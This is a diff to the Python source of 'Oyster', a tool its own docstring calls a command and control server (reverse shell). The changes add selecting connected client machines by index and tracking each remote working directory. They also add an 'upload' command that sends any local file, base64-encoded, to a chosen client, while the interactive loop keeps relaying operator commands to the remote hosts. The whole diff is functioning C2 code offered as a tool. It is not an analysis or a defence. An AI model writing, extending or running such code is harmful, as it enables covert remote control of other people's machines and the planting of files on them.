@@ -5,6 +5,7 @@ import socket
 import sys
 import threading
 from uuid import uuid4
+from base64 import b64encode
 from client import Client
 
 
@@ -31,17 +32,23 @@ class Connection(object):
             closing = False
         return self
 
-    def send_command(self, command, echo=False):
+    def send_command(self, command, echo=False, encode=True):
         """
         Send a command to the connection.
 
         :param command:
+        :param echo:
+        :param encode:
         :return:
         """
 
         if echo:
             print('Sending Command: {}'.format(command))
-        self.connection.send(str.encode(command + '~!_TERM_$~'))
+        if encode:
+            self.connection.send(str.encode(command + '~!_TERM_$~'))
+        else:
+            self.connection.send(command)
+            self.connection.send(str.encode('~!_TERM_$~'))
         return self.get_response()
 
     def get_response(self, echo=False):
@@ -78,6 +85,7 @@ class ConnectionManager(object):
         self.connections = {}
         self.session_id = uuid4()
         self.current_connection = None
+        self.cwd = None
 
     def __iter__(self):
         for k, v in self.connections.items():
@@ -87,9 +95,26 @@ class ConnectionManager(object):
         return len(self.connections)
 
     def __getitem__(self, item):
+        """
+        Get item from dictionary by key or by index.
+
+        :param item:
+        :return:
+        """
+
+        if str(item).isdigit():
+            return list(self.connections.values())[int(item)]
         return self.connections[item]
 
     def __setitem__(self, key, value):
+        """
+        Set an item in the dictionary.
+
+        :param key:
+        :param value:
+        :return:
+        """
+
         self.connections[key] = value
 
     def __delitem__(self, key):
@@ -103,7 +128,7 @@ class ConnectionManager(object):
         """
 
         c = 0
-        client_data = "-------- Clients --------\n"
+        client_data = "-------------- Clients --------------\n"
         for key, connection in self.connections.items():
             client_data += '[{}]'.format(c) + '   ' + key + '   ' + str(connection.port)
             c += 1
@@ -111,7 +136,7 @@ class ConnectionManager(object):
 
     def use_connection(self, ip):
         """
-        Use the given IP as the current connection.
+        Use the given IP as the current connection.  An index can be passed as well.
 
         :param ip:
         :return:
@@ -120,30 +145,50 @@ class ConnectionManager(object):
         if ip is None:
             self.current_connection = None
             return None
+
+        # Set the use_index variable based on whether or not we can int() it the ip.
         try:
-            self.current_connection = self.connections[str(ip)]
-        except KeyError:
-            print('No connection for the given IP address')
-            return None
+            int(ip)
+            use_index = True
+        except ValueError:
+            use_index = False
+
+        # If we need to use_index, then look up the dictionary entry by index.
+        # If not, do regular dictionary lookup.
+        if use_index:
+            try:
+                self.current_connection = list(self.connections.values())[int(ip)]
+            except KeyError:
+                print('No connection for the given key')
+                return None
+        else:
+            try:
+                self.current_connection = self.connections[str(ip)]
+            except KeyError:
+                print('No connection for the given IP address')
+                return None
         return self.current_connection
 
-    def send_command(self, command, echo=False):
+    def send_command(self, command, echo=False, encode=True):
         """
         Send a command to a specific client.
 
         :param ip:
         :param command:
         :param echo:
+        :param encode:
         :return:
         """
 
         if self.current_connection is None:
             print('Run the `use` command to select a connection by ip address before sending commands.')
             return ''
-        response = self.current_connection.send_command(command)
+
+        response = self.current_connection.send_command(command, encode=encode)
 
         if echo:
             print(response)
+        self.cwd = self.current_connection.send_command('oyster getcwd')
         return response
 
     def send_commands(self, command, echo=False):
@@ -215,7 +260,7 @@ class Server(object):
     """
     A simple command and control server(Reverse Shell).
     """
-    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, header=False):
+    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, header=True):
         self.header = header
         header = """\n .oOOOo.
 .O     o.
@@ -269,7 +314,6 @@ o       O o   O `Ooo.   O   OooO'  o
             self.socket.bind((self.host, self.port))
             self.socket.listen(self.listen)
             print('waiting for client connections...', end='\n\n')
-            self.set_cli('Oyster> ')
 
         except socket.error as error_message:
             print('Could not bind the socket:', error_message, '\n', 'Trying again...')
@@ -355,12 +399,12 @@ o       O o   O `Ooo.   O   OooO'  o
 
         :return:
         """
-        self.set_cli(self.connection_mgr.send_command('oyster getcwd'))
+        self.connection_mgr.send_command('oyster getcwd')
         while True:
-            command = input('')
+            command = input(self.connection_mgr.cwd)
 
             if command == 'quit' or command == 'exit':
-                print('Disconnecting from client...\nOyster> ', end='')
+                print('Detaching from client...\nOyster> ', end='')
                 self.connection_mgr.send_command('quit')
                 self.connection_mgr.current_connection = None
                 break
@@ -368,6 +412,40 @@ o       O o   O `Ooo.   O   OooO'  o
             response = self.connection_mgr.send_command(command)
             print(response, end='')
         return
+
+    def handle_upload(self):
+        """
+        Handle a file upload.
+
+        :param command:
+        :return:
+        """
+
+        if self.connection_mgr.current_connection is None:
+            print(self.connection_mgr)
+            connection_id = input('< Enter Client IP or Index > ')
+        else:
+            connection_id = None
+        local_filepath = expanduser(input('< Local File Path > '))
+        remote_filename = input('< Remote File Name > ')
+
+        if connection_id is not None:
+            connection = self.connection_mgr[connection_id]
+        else:
+            connection = self.connection_mgr.current_connection
+
+        print(connection.send_command('upload_filename {}'.format(remote_filename)))
+
+        r = None
+        try:
+            with open(local_filepath, 'rb') as f:
+                data = b64encode(f.read())
+                r = connection.send_command('upload_data')
+                r += '\n' + connection.send_command(data, encode=False)
+        except FileNotFoundError as err_msg:
+            print(err_msg)
+
+        return r
 
     def open_oyster(self):
         """
@@ -378,11 +456,10 @@ o       O o   O `Ooo.   O   OooO'  o
 
         sleep(1)
         while True:
-            command = input()
+            command = input('Oyster> ')
 
             if command == 'list':
                 print(self.connection_mgr)
-                self.set_cli('Oyster> ')
                 continue
 
             if command[:3] == 'use':
@@ -391,7 +468,6 @@ o       O o   O `Ooo.   O   OooO'  o
                 # Use a connection.
                 r = self.connection_mgr.use_connection(command[3:].strip())
                 if r is None:
-                    self.set_cli('Oyster> ')
                     continue
 
                 self.client_shell()
@@ -399,12 +475,14 @@ o       O o   O `Ooo.   O   OooO'  o
 
             if command == 'update all':
                 self.update_clients()
-                self.set_cli('Oyster> ')
+                continue
+
+            if command == 'upload':
+                print(self.handle_upload())
                 continue
 
             if command == 'flush':
                 # Flush anything that fucks up the server.
-                self.set_cli('Oyster> ')
                 continue
 
             if command == 'quit' or command == 'exit' or command == 'shutdown':
@@ -412,11 +490,16 @@ o       O o   O `Ooo.   O   OooO'  o
                 return False
 
             if self.connection_mgr.current_connection is not None:
-                print(self.connection_mgr.current_connection.send_command(command))
-            self.set_cli('Oyster> ')
+                print(self.connection_mgr.send_command(command))
         return
 
     def handle_quit(self):
+        """
+        Handle a quit event issued by the Oyster Shell.
+
+        :return:
+        """
+
         # Open a client with the `server_shutdown` and
         # `shutdown_kill` flags.  This will tell the
         # client to tell the servers connection
@@ -437,7 +520,7 @@ o       O o   O `Ooo.   O   OooO'  o
 
     def reboot_self(self):
         """
-        Reboot this script.
+        Reboot the server.py script.
 
         :return:
         """
